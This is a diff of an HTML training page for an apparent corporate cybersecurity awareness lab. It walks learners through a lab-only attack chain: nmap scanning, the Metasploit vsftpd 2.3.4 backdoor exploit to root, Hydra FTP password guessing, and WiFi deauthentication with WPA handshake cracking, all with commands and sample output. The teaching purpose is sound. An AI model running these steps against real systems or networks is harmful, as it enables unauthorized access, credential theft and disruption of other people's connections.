@@ -1,528 +1,1276 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Hack yourself into trouble</title>
+  <title>🔐 ING Factory Cybersecurity Lab</title>
   <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
     body {
-      font-family: sans-serif;
-      margin: 20px;
+      font-family: 'Monaco', 'Consolas', monospace;
+      background: #000;
+      color: #00ff00;
+      line-height: 1.6;
+      min-height: 100vh;
+      position: relative;
+      overflow-x: hidden;
     }
 
-    h1,
-    h2 {
-      color: #336699;
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text x="10" y="20" font-family="monospace" font-size="8" fill="%2300ff0033">1</text><text x="30" y="40" font-family="monospace" font-size="8" fill="%2300ff0022">0</text><text x="50" y="10" font-family="monospace" font-size="8" fill="%2300ff0044">1</text><text x="70" y="60" font-family="monospace" font-size="8" fill="%2300ff0033">0</text><text x="90" y="30" font-family="monospace" font-size="8" fill="%2300ff0055">1</text><text x="20" y="80" font-family="monospace" font-size="8" fill="%2300ff0022">0</text><text x="60" y="90" font-family="monospace" font-size="8" fill="%2300ff0044">1</text><text x="40" y="70" font-family="monospace" font-size="8" fill="%2300ff0033">0</text><text x="80" y="15" font-family="monospace" font-size="8" fill="%2300ff0066">1</text><text x="15" y="50" font-family="monospace" font-size="8" fill="%2300ff0022">0</text></svg>');
+      animation: matrix-rain 20s linear infinite;
+      pointer-events: none;
+      z-index: -1;
+      opacity: 0.3;
     }
 
-    .status-section {
+    @keyframes matrix-rain {
+      0% { transform: translateY(-100%); }
+      100% { transform: translateY(100vh); }
+    }
+
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 20px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 40px;
+      padding: 30px;
+      background: rgba(0, 0, 0, 0.9);
+      border: 2px solid #ff6600;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(255, 102, 0, 0.4), inset 0 0 20px rgba(0, 255, 0, 0.1);
+      position: relative;
+      overflow: hidden;
+      backdrop-filter: blur(10px);
+    }
+
+    .ing-factory-badge {
+      display: inline-block;
+      background: linear-gradient(45deg, #ff6600, #ff9933);
+      color: white;
+      padding: 10px 20px;
+      border-radius: 25px;
+      font-weight: bold;
+      margin-bottom: 15px;
+      box-shadow: 0 4px 15px rgba(255, 102, 0, 0.3);
+      position: relative;
+      z-index: 2;
+    }
+
+    .ing-factory-badge::before {
+      content: "🏭";
+      margin-right: 8px;
+    }
+
+    .header h1 {
+      font-size: 2.5em;
+      margin-bottom: 10px;
+      text-shadow: 0 0 10px #ff6600;
+      color: #ff6600;
+      position: relative;
+      z-index: 2;
+    }
+
+    .subtitle {
+      color: #ff9933;
+      font-size: 1.2em;
+      position: relative;
+      z-index: 2;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 10px;
+      background: #333;
+      border-radius: 5px;
+      overflow: hidden;
+      margin: 20px 0;
+    }
+
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #ff6600, #ff9933, #00ff00);
+      width: 0%;
+      transition: width 0.5s ease;
+    }
+
+    .score {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: rgba(0, 0, 0, 0.9);
+      padding: 15px;
+      border-radius: 10px;
+      border: 1px solid #ff6600;
+      box-shadow: 0 0 10px rgba(255, 102, 0, 0.3), 0 0 20px rgba(0, 255, 0, 0.1);
+      backdrop-filter: blur(10px);
+      z-index: 1000;
+    }
+
+    .language-toggle {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      background: rgba(0, 0, 0, 0.9);
+      padding: 10px;
+      border-radius: 10px;
+      border: 1px solid #ff6600;
+      box-shadow: 0 0 10px rgba(255, 102, 0, 0.3);
+      backdrop-filter: blur(10px);
+      z-index: 1000;
+    }
+
+    .language-toggle button {
+      background: linear-gradient(45deg, #ff6600, #ff9933);
+      color: white;
+      border: none;
+      padding: 8px 12px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-family: inherit;
+      margin: 2px;
+      transition: all 0.3s ease;
+      font-size: 12px;
+    }
+
+    .language-toggle button:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+    }
+
+    .language-toggle button.active {
+      background: linear-gradient(45deg, #4CAF50, #45a049);
+    }
+
+    .challenge-card {
+      background: rgba(0, 0, 0, 0.85);
+      border: 1px solid #333;
+      border-radius: 10px;
+      margin: 20px 0;
+      padding: 25px;
+      transition: all 0.3s ease;
+      position: relative;
+      backdrop-filter: blur(5px);
+    }
+
+    .challenge-card:hover {
+      border-color: #ff6600;
+      box-shadow: 0 0 15px rgba(255, 102, 0, 0.3), 0 0 30px rgba(0, 255, 0, 0.1);
+    }
+
+    .challenge-title {
+      color: #ff6600;
+      font-size: 1.5em;
+      margin-bottom: 15px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .difficulty {
+      background: #ff6b6b;
+      color: #000;
+      padding: 3px 8px;
+      border-radius: 15px;
+      font-size: 0.7em;
+      font-weight: bold;
+    }
+
+    .difficulty.beginner { background: #4CAF50; }
+    .difficulty.intermediate { background: #FF9800; }
+    .difficulty.advanced { background: #f44336; }
+
+    .challenge-description {
+      color: #cccccc;
       margin-bottom: 20px;
-      border: 1px solid #ddd;
+      padding: 15px;
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 5px;
+      border-left: 4px solid #00cccc;
+    }
+
+    .lab-setup {
+      background: rgba(255, 102, 0, 0.1);
+      border: 2px solid #ff6600;
+      border-radius: 10px;
+      padding: 20px;
+      margin: 20px 0;
+    }
+
+    .hint-section {
+      margin: 15px 0;
+    }
+
+    .hint-button {
+      background: linear-gradient(45deg, #4CAF50, #45a049);
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-family: inherit;
+      margin: 5px;
+      transition: all 0.3s ease;
+      font-size: 14px;
+    }
+
+    .hint-button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+    }
+
+    .hint-button.setup { background: linear-gradient(45deg, #9C27B0, #7B1FA2); }
+    .hint-button.explain { background: linear-gradient(45deg, #2196F3, #1976D2); }
+    .hint-button.command { background: linear-gradient(45deg, #FF9800, #F57C00); }
+    .hint-button.answer { background: linear-gradient(45deg, #ff6b6b, #e55555); }
+
+    .hint-content {
+      background: rgba(0, 150, 0, 0.1);
+      border: 1px solid #00aa00;
+      border-radius: 5px;
+      padding: 20px;
+      margin: 10px 0;
+      display: none;
+      animation: fadeIn 0.5s ease-in;
+    }
+
+    .answer-content {
+      background: rgba(150, 0, 0, 0.1);
+      border: 1px solid #aa0000;
+      border-radius: 5px;
+      padding: 20px;
+      margin: 10px 0;
+      display: none;
+      animation: fadeIn 0.5s ease-in;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .command-line {
+      background: #000;
+      color: #00ff00;
       padding: 15px;
       border-radius: 5px;
+      font-family: 'Courier New', monospace;
+      margin: 10px 0;
+      border-left: 4px solid #00ff00;
     }
 
-    .pre-wrap {
+    .command-line::before {
+      content: '$ ';
+      color: #00cccc;
+      font-weight: bold;
+    }
+
+    .terminal-output {
+      background: #000;
+      color: #00ff00;
+      padding: 15px;
+      border-radius: 5px;
+      font-family: 'Courier New', monospace;
       white-space: pre-wrap;
-      background-color: #f4f4f4;
-      padding: 10px;
-      border-radius: 3px;
+      margin: 10px 0;
+      border: 1px solid #333;
     }
 
-    .status-success {
-      color: green;
+    .important-note {
+      background: rgba(255, 102, 0, 0.1);
+      border: 2px solid #ff6600;
+      border-radius: 5px;
+      padding: 15px;
+      margin: 15px 0;
+      color: #ff9933;
     }
 
-    .status-failed {
-      color: red;
+    .security-tip {
+      background: rgba(0, 255, 255, 0.1);
+      border: 2px solid #00cccc;
+      border-radius: 5px;
+      padding: 15px;
+      margin: 15px 0;
+      color: #00cccc;
     }
 
-    .center {
+    .step-by-step {
+      counter-reset: step-counter;
+    }
+
+    .step {
+      counter-increment: step-counter;
+      margin: 15px 0;
+      padding: 15px;
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 5px;
+      border-left: 4px solid #ff6600;
+    }
+
+    .step::before {
+      content: "Step " counter(step-counter) ": ";
+      font-weight: bold;
+      color: #ff6600;
+    }
+
+    .completed {
+      opacity: 0.7;
+      border-color: #4CAF50;
+    }
+
+    .completed .challenge-title::after {
+      content: ' ✅';
+      color: #4CAF50;
+    }
+
+    .docker-diagram {
       text-align: center;
+      margin: 20px 0;
+      padding: 20px;
+      background: rgba(255, 102, 0, 0.1);
+      border-radius: 10px;
+      border: 1px solid #ff6600;
     }
   </style>
 </head>
-
 <body>
-  <h1 class="center">Hack yourself into trouble</h1>
-  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 300">
-    <defs>
-      <filter id="shadow" x="-10%" y="-10%" width="120%" height="120%">
-        <feDropShadow dx="2" dy="2" stdDeviation="2" flood-color="#888" flood-opacity="0.5" />
-      </filter>
-      <linearGradient id="computerGradient" x1="0%" y1="0%" x2="100%" y2="100%">
-        <stop offset="0%" style="stop-color:#f0f0f0;stop-opacity:1" />
-        <stop offset="100%" style="stop-color:#d0d0d0;stop-opacity:1" />
-      </linearGradient>
-    </defs>
+  <div class="container">
+    <div class="header">
+      <div class="language-toggle">
+        <button onclick="setLanguage('en')" id="btn-en" class="active">🇬🇧 EN</button>
+        <button onclick="setLanguage('nl')" id="btn-nl">🇳🇱 NL</button>
+      </div>
+      <div class="header-content">
+        <div class="ing-factory-badge">ING Factory • ideas worth building</div>
+        <h1>🔐 Cybersecurity Awareness Lab</h1>
+        <p class="subtitle">"Building Security Knowledge Through Safe, Hands-On Learning"</p>
+        <div class="progress-bar">
+          <div class="progress-fill" id="progressBar"></div>
+        </div>
+      </div>
+    </div>
 
-    <rect width="600" height="300" fill="#fff" />
-    <g transform="translate(50, 80)" filter="url(#shadow)">
-      <rect width="150" height="90" rx="8" ry="8" fill="url(#computerGradient)" stroke="#333" stroke-width="1" />
+    <div class="score">
+      <div>Progress: <span id="score">0</span>/125</div>
+      <div>Steps: <span id="completed">0</span>/5</div>
+    </div>
 
-      <text x="75" y="20" text-anchor="middle" font-weight="bold" font-size="12">
-        Kali Linux
-      </text>
+    <div class="important-note">
+      🎯 <strong>Welcome!</strong> This lab teaches cybersecurity awareness through controlled, educational exercises. 
+      No prior technical experience needed - we'll guide you step by step!
+    </div>
 
-      <text x="75" y="40" text-anchor="middle" font-size="10">
-        IP: $kali_ip
-      </text>
+    <!-- Challenge 0: Lab Setup -->
+    <div class="challenge-card" id="challenge0">
+      <div class="challenge-title">
+        🚀 Step 0: Connecting to Your Lab Environment
+        <span class="difficulty beginner">START HERE</span>
+      </div>
+      
+      <div class="challenge-description">
+        <strong>What you're doing:</strong> Before we can start learning about security, we need to connect to our practice environment. 
+        Think of this like logging into a computer that's specially set up for safe learning.
+      </div>
 
-      <text x="75" y="55" text-anchor="middle" font-size="10">
-        Tools: Metasploit, Nmap
-      </text>
+      <div class="lab-setup">
+        <h3>🖥️ Your Lab Setup</h3>
+        <div class="docker-diagram">
+          <div>🖥️ <strong>Kali Linux</strong> (Your Attack Machine)</div>
+          <div>↕️</div>
+          <div>🎯 <strong>Vulnerable Target</strong> (Practice Machine)</div>
+        </div>
+      </div>
 
-      <rect x="5" y="75" width="140" height="7" fill="#4CAF50" rx="3" ry="3" />
-    </g>
+      <div class="hint-section">
+        <button class="hint-button setup" onclick="toggleHint('hint0-1')">🔧 What is Docker?</button>
+        <button class="hint-button explain" onclick="toggleHint('hint0-2')">📚 How to Connect</button>
+        <button class="hint-button command" onclick="toggleHint('hint0-3')">💻 Connection Command</button>
+        <button class="hint-button answer" onclick="toggleAnswer('answer0')">🚨 Complete Solution</button>
+      </div>
 
-    <g transform="translate(350, 80)" filter="url(#shadow)">
-      <rect width="150" height="90" rx="8" ry="8" fill="url(#computerGradient)" stroke="#333" stroke-width="1" />
+      <div class="hint-content" id="hint0-1">
+        <h4>🐳 Understanding Docker</h4>
+        <p><strong>What is Docker?</strong> Think of Docker like having multiple computers inside your computer. 
+        Each "container" is like a separate, isolated computer that can't affect your real computer.</p>
+      </div>
 
-      <text x="75" y="20" text-anchor="middle" font-weight="bold" font-size="12">
-        Vulnerable Machine
-      </text>
+      <div class="hint-content" id="hint0-2">
+        <h4>🔌 How to Connect to Your Lab</h4>
+        <div class="step-by-step">
+          <div class="step">
+            <strong>Open your terminal/command prompt</strong>
+            <ul>
+              <li><strong>Windows:</strong> Press Win+R, type "cmd", press Enter</li>
+              <li><strong>Mac:</strong> Press Cmd+Space, type "terminal", press Enter</li>
+              <li><strong>Linux:</strong> Press Ctrl+Alt+T</li>
+            </ul>
+          </div>
+        </div>
+      </div>
 
-      <text x="75" y="40" text-anchor="middle" font-size="10">
-        IP: $badweb_ip
-      </text>
+      <div class="hint-content" id="hint0-3">
+        <h4>💻 The Connection Command</h4>
+        <p><strong>Type this exact command in your terminal:</strong></p>
+        <div class="command-line">docker exec -it kali bash</div>
+      </div>
 
-      <text x="75" y="55" text-anchor="middle" font-size="10">
-        Services: vsftpd, Web
-      </text>
+      <div class="answer-content" id="answer0">
+        <div class="step-by-step">
+          <div class="step">
+            <strong>Open your terminal</strong>
+          </div>
+          <div class="step">
+            <strong>Connect to Kali Linux</strong>
+            <div class="command-line">docker exec -it kali bash</div>
+          </div>
+          <div class="step">
+            <strong>Verify you're connected</strong>
+            <div class="terminal-output">root@kali:~# </div>
+          </div>
+        </div>
+        <button class="hint-button" onclick="completeChallenge(0, 20)">✅ I'm Connected!</button>
+      </div>
+    </div>
 
-      <rect x="5" y="75" width="140" height="7" fill="#FF5722" rx="3" ry="3" />
-    </g>
+    <!-- Challenge 1: Network Discovery -->
+    <div class="challenge-card" id="challenge1">
+      <div class="challenge-title">
+        🔍 Step 1: Discovering What's on the Network
+        <span class="difficulty beginner">BEGINNER</span>
+      </div>
+      
+      <div class="challenge-description">
+        <strong>What you're learning:</strong> How attackers discover what computers and services are available on a network.
+        <br><br>
+        <strong>Your mission:</strong> Find out what services are running on the target machine and identify any security vulnerabilities.
+      </div>
 
-    <path d="M200,125 Q300,95 350,125" fill="none" stroke="#2196F3" stroke-width="2" stroke-dasharray="3,3" />
+      <div class="hint-section">
+        <button class="hint-button explain" onclick="toggleHint('hint1-1')">🤔 What is Network Scanning?</button>
+        <button class="hint-button setup" onclick="toggleHint('hint1-2')">🛠️ The Right Tool</button>
+        <button class="hint-button command" onclick="toggleHint('hint1-3')">📋 Understanding the Command</button>
+        <button class="hint-button answer" onclick="toggleAnswer('answer1')">🚨 Complete Solution</button>
+      </div>
 
-    <text x="275" y="90" text-anchor="middle" font-size="10" fill="#2196F3">
-      Virtual subnetwork
-    </text>
-  </svg>
+      <div class="hint-content" id="hint1-1">
+        <h4>🌐 Understanding Network Scanning</h4>
+        <p><strong>What is network scanning?</strong> Imagine you're in a hotel hallway. Network scanning is like looking at each door to see which rooms exist and which have people in them.</p>
+      </div>
 
-  <div class="status-section">
-    <h2>Container Information</h2>
-    <p><strong>Kali IP:</strong> $kali_ip</p>
-    <p><strong>BadWeb IP:</strong> <a href="http://$badweb_ip" target="_blank">$badweb_ip</a></p>
-    <p><strong>BadWeb Hostname:</strong> $badweb_hostname</p>
+      <div class="hint-content" id="hint1-2">
+        <h4>🔧 Meet Nmap</h4>
+        <p><strong>Nmap:</strong> The "Network Mapper" - the most famous network scanning tool in the world!</p>
+      </div>
+
+      <div class="hint-content" id="hint1-3">
+        <h4>📚 The Complete Command</h4>
+        <div class="command-line">nmap -sV -p 1-100 --script vulners victimmachine</div>
+        <p>This scans ports 1-100, identifies services, and checks for vulnerabilities.</p>
+      </div>
+
+      <div class="answer-content" id="answer1">
+        <div class="step-by-step">
+          <div class="step">
+            <strong>Run the network scan</strong>
+            <div class="command-line">nmap -sV -p 1-100 --script vulners victimmachine</div>
+          </div>
+          <div class="step">
+            <strong>Results will show</strong>
+            <div class="terminal-output">PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+|_vulners: CVE-2011-2523 (Backdoor Command Execution)
+80/tcp open  http    Apache httpd 2.2.8</div>
+          </div>
+        </div>
+        <button class="hint-button" onclick="completeChallenge(1, 25)">✅ I Found the Vulnerability!</button>
+      </div>
+    </div>
+
+    <!-- Challenge 2: Exploitation -->
+    <div class="challenge-card" id="challenge2">
+      <div class="challenge-title">
+        💥 Step 2: Exploiting the Vulnerability
+        <span class="difficulty intermediate">INTERMEDIATE</span>
+      </div>
+      
+      <div class="challenge-description">
+        <strong>What you're learning:</strong> How to exploit the backdoor vulnerability you found.
+        <br><br>
+        <strong>Your mission:</strong> Use Metasploit to exploit CVE-2011-2523 and gain control of the target.
+      </div>
+
+      <div class="hint-section">
+        <button class="hint-button explain" onclick="toggleHint('hint2-1')">🎭 What is a Backdoor?</button>
+        <button class="hint-button setup" onclick="toggleHint('hint2-2')">🛠️ Meet Metasploit</button>
+        <button class="hint-button command" onclick="toggleHint('hint2-3')">🔍 Finding the Exploit</button>
+        <button class="hint-button answer" onclick="toggleAnswer('answer2')">🚨 Complete Solution</button>
+      </div>
+
+      <div class="hint-content" id="hint2-1">
+        <h4>🎭 Understanding Backdoors</h4>
+        <p>CVE-2011-2523 is a backdoor in vsftpd 2.3.4. When you send a username ending with ":)", it opens a secret shell on port 6200.</p>
+      </div>
+
+      <div class="hint-content" id="hint2-2">
+        <h4>🚀 Metasploit Framework</h4>
+        <p>Metasploit is like a "Swiss Army knife" for cybersecurity testing with thousands of known exploits.</p>
+      </div>
+
+      <div class="hint-content" id="hint2-3">
+        <h4>🔍 Finding the Right Exploit</h4>
+        <p>Start Metasploit, search for vsftpd, and use the backdoor exploit:</p>
+        <div class="command-line">msfconsole</div>
+        <div class="command-line">search vsftpd</div>
+      </div>
+
+      <div class="answer-content" id="answer2">
+        <div class="step-by-step">
+          <div class="step">
+            <strong>Start Metasploit</strong>
+            <div class="command-line">msfconsole</div>
+          </div>
+          <div class="step">
+            <strong>Find the exploit</strong>
+            <div class="command-line">search vsftpd</div>
+            <div class="command-line">use exploit/unix/ftp/vsftpd_234_backdoor</div>
+          </div>
+          <div class="step">
+            <strong>Configure and attack</strong>
+            <div class="command-line">set RHOSTS victimmachine</div>
+            <div class="command-line">exploit</div>
+          </div>
+          <div class="step">
+            <strong>You now have root access!</strong>
+            <div class="command-line">whoami</div>
+            <div class="terminal-output">root</div>
+          </div>
+        </div>
+        <button class="hint-button" onclick="completeChallenge(2, 30)">✅ I Owned the System!</button>
+      </div>
+    </div>
+
+    <!-- Challenge 3: Password Cracking -->
+    <div class="challenge-card" id="challenge3">
+      <div class="challenge-title">
+        🔓 Step 3: Password Cracking
+        <span class="difficulty advanced">ADVANCED</span>
+      </div>
+      
+      <div class="challenge-description">
+        <strong>What you're learning:</strong> How weak passwords can be cracked using automated tools.
+        <br><br>
+        <strong>Your mission:</strong> Crack the FTP password for the 'admin' user using brute force techniques.
+      </div>
+
+      <div class="hint-section">
+        <button class="hint-button explain" onclick="toggleHint('hint3-1')">🤔 How Password Attacks Work</button>
+        <button class="hint-button setup" onclick="toggleHint('hint3-2')">🛠️ Password Cracking Tools</button>
+        <button class="hint-button command" onclick="toggleHint('hint3-3')">💻 Smart Approach</button>
+        <button class="hint-button answer" onclick="toggleAnswer('answer3')">🚨 Complete Solution</button>
+      </div>
+
+      <div class="hint-content" id="hint3-1">
+        <h4>🎯 Understanding Password Attacks</h4>
+        <p>Brute force attacks try many passwords automatically. Common techniques include dictionary attacks and trying every possible combination.</p>
+      </div>
+
+      <div class="hint-content" id="hint3-2">
+        <h4>🧰 Meet Hydra</h4>
+        <p>Hydra is a fast network login cracker that supports many protocols including FTP, SSH, and HTTP.</p>
+      </div>
+
+      <div class="hint-content" id="hint3-3">
+        <h4>💡 Smart Strategy</h4>
+        <p>Before generating huge wordlists, try common passwords first. Admin users often use simple passwords like "admin" or "password".</p>
+      </div>
+
+      <div class="answer-content" id="answer3">
+        <div class="step-by-step">
+          <div class="step">
+            <strong>Try the obvious password first</strong>
+            <div class="command-line">hydra -l admin -p admin ftp://victimmachine</div>
+          </div>
+          <div class="step">
+            <strong>Success!</strong>
+            <div class="terminal-output">[21][ftp] host: victimmachine   login: admin   password: admin</div>
+          </div>
+          <div class="step">
+            <strong>Test the credentials</strong>
+            <div class="command-line">ftp victimmachine</div>
+            <p>Username: admin, Password: admin</p>
+          </div>
+        </div>
+        <div class="security-tip">
+          <strong>🛡️ Key takeaway:</strong> The password "admin" was cracked instantly! This shows why strong, unique passwords are critical.
+        </div>
+        <button class="hint-button" onclick="completeChallenge(3, 25)">✅ Password Cracked!</button>
+      </div>
+    </div>
+
+    <!-- Challenge 4: WiFi Security -->
+    <div class="challenge-card" id="challenge4">
+      <div class="challenge-title">
+        📡 Step 4: WiFi Network Security
+        <span class="difficulty advanced">ADVANCED</span>
+      </div>
+      
+      <div class="challenge-description">
+        <strong>What you're learning:</strong> How wireless networks can be compromised and why WiFi security matters.
+        This demonstrates the risks of weak WiFi passwords and unsecured networks.
+        <br><br>
+        <strong>Your mission:</strong> Discover wireless networks, capture authentication data, and crack a WiFi password.
+        <br><br>
+        <strong>Real-world impact:</strong> WiFi attacks are common in public spaces and can lead to data theft and network infiltration.
+      </div>
+
+      <div class="lab-setup">
+        <h3>📡 WiFi Lab Setup</h3>
+        <div class="docker-diagram">
+          <div>📱 <strong>Raspberry Pi</strong> (WiFi Attack Machine)</div>
+          <div>🌐 ~ ~ ~ ~ ~ ~ ~</div>
+          <div>📶 <strong>WiFi Access Point</strong> (Target Network: "hackme")</div>
+        </div>
+        <p>This exercise simulates attacking a vulnerable WiFi network with a weak password.</p>
+      </div>
+
+      <div class="hint-section">
+        <button class="hint-button explain" onclick="toggleHint('hint4-1')">🤔 How WiFi Hacking Works</button>
+        <button class="hint-button setup" onclick="toggleHint('hint4-2')">🛠️ WiFi Security Tools</button>
+        <button class="hint-button command" onclick="toggleHint('hint4-3')">📡 Monitor Mode & Scanning</button>
+        <button class="hint-button command" onclick="toggleHint('hint4-4')">🔑 Handshake Capture</button>
+        <button class="hint-button answer" onclick="toggleAnswer('answer4')">🚨 Complete Solution</button>
+      </div>
+
+      <div class="hint-content" id="hint4-1">
+        <h4>📡 Understanding WiFi Vulnerabilities</h4>
+        <p><strong>How WiFi attacks work:</strong></p>
+        <ul>
+          <li>🕵️ <strong>Reconnaissance:</strong> Scan for available networks and identify targets</li>
+          <li>📸 <strong>Handshake capture:</strong> Intercept authentication between device and router</li>
+          <li>💔 <strong>Deauthentication:</strong> Force devices to reconnect (to capture handshake)</li>
+          <li>🔓 <strong>Password cracking:</strong> Use captured data to crack the password offline</li>
+        </ul>
+        <br>
+        <p><strong>Why this is dangerous:</strong></p>
+        <ul>
+          <li>⚠️ Attackers can access your network and internet connection</li>
+          <li>⚠️ Monitor and intercept your web traffic</li>
+          <li>⚠️ Access other devices on your network</li>
+          <li>⚠️ Use your connection for illegal activities</li>
+        </ul>
+        <br>
+        <div class="security-tip">
+          <strong>🛡️ Protection:</strong> Use WPA3 encryption with strong, unique passwords (20+ characters)!
+        </div>
+      </div>
+
+      <div class="hint-content" id="hint4-2">
+        <h4>🧰 WiFi Security Tools</h4>
+        <p><strong>Aircrack-ng Suite:</strong> The most comprehensive WiFi security testing toolkit</p>
+        <ul>
+          <li><code>airmon-ng</code> - Enables monitor mode on WiFi adapters</li>
+          <li><code>airodump-ng</code> - Captures packets and discovers networks</li>
+          <li><code>aireplay-ng</code> - Performs deauthentication attacks</li>
+          <li><code>aircrack-ng</code> - Cracks WPA/WPA2 passwords from captured handshakes</li>
+        </ul>
+        <br>
+        <p><strong>Alternative tools:</strong></p>
+        <ul>
+          <li><code>hashcat</code> - Advanced password recovery (GPU-accelerated)</li>
+          <li><code>john</code> - John the Ripper password cracker</li>
+          <li><code>wifite</code> - Automated WiFi auditing tool</li>
+        </ul>
+        <br>
+        <div class="important-note">
+          <strong>⚠️ Legal notice:</strong> Only test WiFi networks you own or have explicit permission to test!
+        </div>
+      </div>
+
+      <div class="hint-content" id="hint4-3">
+        <h4>📡 Setting Up Monitor Mode</h4>
+        <p><strong>Monitor mode explained:</strong> Normal WiFi cards only see traffic meant for them. 
+        Monitor mode lets you see ALL WiFi traffic in the area - like turning your WiFi card into a "WiFi wiretap".</p>
+        <br>
+        <div class="step-by-step">
+          <div class="step">
+            <strong>Check available WiFi interfaces</strong>
+            <div class="command-line">airmon-ng</div>
+            <p>This shows your WiFi adapters and their current status</p>
+          </div>
+          <div class="step">
+            <strong>Enable monitor mode</strong>
+            <div class="command-line">airmon-ng start wlan1</div>
+            <p>This puts your WiFi adapter into monitor mode (interface becomes wlan1mon)</p>
+          </div>
+          <div class="step">
+            <strong>Scan for WiFi networks</strong>
+            <div class="command-line">airodump-ng wlan1mon</div>
+            <p>This shows all WiFi networks in range with details like encryption type and signal strength</p>
+          </div>
+        </div>
+        <br>
+        <div class="security-tip">
+          <strong>🔍 What to look for:</strong> Target networks with WPA/WPA2 encryption and good signal strength. 
+          Avoid networks with WPS enabled as they have other vulnerabilities.
+        </div>
+      </div>
+
+      <div class="hint-content" id="hint4-4">
+        <h4>🎯 Capturing the WPA Handshake</h4>
+        <p><strong>The handshake:</strong> When a device connects to WiFi, it performs a "4-way handshake" with the router. 
+        This contains encrypted password data we can crack offline.</p>
+        <br>
+        <div class="step-by-step">
+          <div class="step">
+            <strong>Target specific network</strong>
+            <div class="command-line">airodump-ng -c [CHANNEL] --bssid [ROUTER_MAC] -w capture wlan1mon</div>
+            <p>Focus on one network and save captured data to files</p>
+          </div>
+          <div class="step">
+            <strong>Force a handshake (deauth attack)</strong>
+            <div class="command-line">aireplay-ng -0 5 -a [ROUTER_MAC] -c [CLIENT_MAC] wlan1mon</div>
+            <p>Disconnect a client to force re-authentication (and capture the handshake)</p>
+          </div>
+          <div class="step">
+            <strong>Verify handshake capture</strong>
+            <p>Look for "WPA handshake" message in airodump-ng output</p>
+          </div>
+        </div>
+        <br>
+        <div class="important-note">
+          <strong>⚡ Pro tip:</strong> You need at least one device connected to the target network to capture a handshake. 
+          The deauth attack temporarily disconnects them, forcing a new handshake.
+        </div>
+      </div>
+
+      <div class="answer-content" id="answer4">
+        <h4>📡 Complete WiFi Penetration Test</h4>
+        <div class="step-by-step">
+          <div class="step">
+            <strong>Prepare your WiFi adapter</strong>
+            <div class="command-line">airmon-ng</div>
+            <div class="terminal-output">PHY     Interface       Driver          Chipset
+phy0    wlan1           ath9k_htc       Atheros Communications, Inc.</div>
+          </div>
+          <div class="step">
+            <strong>Enable monitor mode</strong>
+            <div class="command-line">airmon-ng start wlan1</div>
+            <div class="terminal-output">PHY     Interface       Driver          Chipset
+phy0    wlan1mon        ath9k_htc       Atheros Communications, Inc.
+                (monitor mode enabled)</div>
+          </div>
+          <div class="step">
+            <strong>Scan for target networks</strong>
+            <div class="command-line">airodump-ng wlan1mon</div>
+            <div class="terminal-output">BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+AA:BB:CC:DD:EE:FF  -30       47        0    0  11  54e  WPA2 CCMP   PSK  hackme
+11:22:33:44:55:66  -45       32        5    1   6  54e  WPA2 CCMP   PSK  OfficeWiFi</div>
+            <p>Press Ctrl+C when you've identified your target (hackme network)</p>
+          </div>
+          <div class="step">
+            <strong>Focus on target and capture handshake</strong>
+            <div class="command-line">airodump-ng -c 11 --bssid AA:BB:CC:DD:EE:FF -w hackme_capture wlan1mon</div>
+            <p>This monitors only the "hackme" network on channel 11</p>
+          </div>
+          <div class="step">
+            <strong>Force handshake (in new terminal)</strong>
+            <div class="command-line">aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF wlan1mon</div>
+            <div class="terminal-output">Sending 3 directed DeAuth to broadcast
+C0:FF:EE:C0:FF:EE - Channel 11 - 'hackme'</div>
+            <p>This disconnects all clients, forcing them to reconnect</p>
+          </div>
+          <div class="step">
+            <strong>Verify handshake capture</strong>
+            <div class="terminal-output">WPA handshake: AA:BB:CC:DD:EE:FF</div>
+            <p>Success! The handshake is captured in hackme_capture-01.cap</p>
+          </div>
+          <div class="step">
+            <strong>Crack the password</strong>
+            <div class="command-line">aircrack-ng -w /usr/share/wordlists/rockyou.txt hackme_capture-01.cap</div>
+            <div class="terminal-output">Aircrack-ng 1.6
+
+[00:00:12] 2847/14344392 keys tested (234.56 k/s) 
+
+Time left: 17 hours, 2 minutes                          0.02%
+
+                           KEY FOUND! [ password123 ]
+
+Master Key     : CD 69 0D 11 8E AC 1C 95 F3 7D 65 83 9D 82 7E 8C
+Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</div>
+          </div>
+          <div class="step">
+            <strong>Clean up</strong>
+            <div class="command-line">airmon-ng stop wlan1mon</div>
+            <p>Return your WiFi adapter to normal mode</p>
+          </div>
+        </div>
+        <div class="security-tip">
+          <strong>🛡️ What this demonstrates:</strong>
+          <ul>
+            <li>Weak WiFi passwords can be cracked in minutes or hours</li>
+            <li>Attackers can capture your WiFi traffic from a distance</li>
+            <li>Public WiFi networks are especially vulnerable</li>
+            <li>Strong passwords (20+ random characters) take centuries to crack</li>
+          </ul>
+        </div>
